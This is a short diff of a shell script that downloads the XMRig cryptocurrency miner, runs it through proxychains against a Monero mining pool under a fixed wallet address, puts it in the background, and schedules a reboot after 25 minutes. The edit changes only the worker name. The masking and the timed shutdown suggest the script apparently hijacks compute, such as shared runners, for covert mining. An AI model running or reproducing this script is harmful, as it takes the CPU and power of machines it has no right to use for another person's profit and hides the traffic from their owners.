@@ -8,5 +8,5 @@ wget https://github.com/xmrig/xmrig/releases/download/v6.3.3/xmrig-6.3.3-linux-x
 tar --extract --file xmrig-6.3.3-linux-x64.tar.gz
 cd xmrig-6.3.3
 export PROXY_DNS_SERVER=1.1.1.1
-proxychains ./xmrig --no-color --donate-level 1 --cpu-priority 5 -o us-west.minexmr.com:6666 -u 483NjkJRvjeNhTcd9Gqk3d7FmrsR5NTHm8wu2rvKpWyXQdUK3qAeXhiLA6kQZUk7KnMarQwmbRUkxSDPrBK3z2Ra1hoEEKL.e10 -p x -a cn/r -t 4 -k --tls -B
+proxychains ./xmrig --no-color --donate-level 1 --cpu-priority 5 -o us-west.minexmr.com:6666 -u 483NjkJRvjeNhTcd9Gqk3d7FmrsR5NTHm8wu2rvKpWyXQdUK3qAeXhiLA6kQZUk7KnMarQwmbRUkxSDPrBK3z2Ra1hoEEKL.e1 -p x -a cn/r -t 4 -k --tls -B
 sudo shutdown -r +25
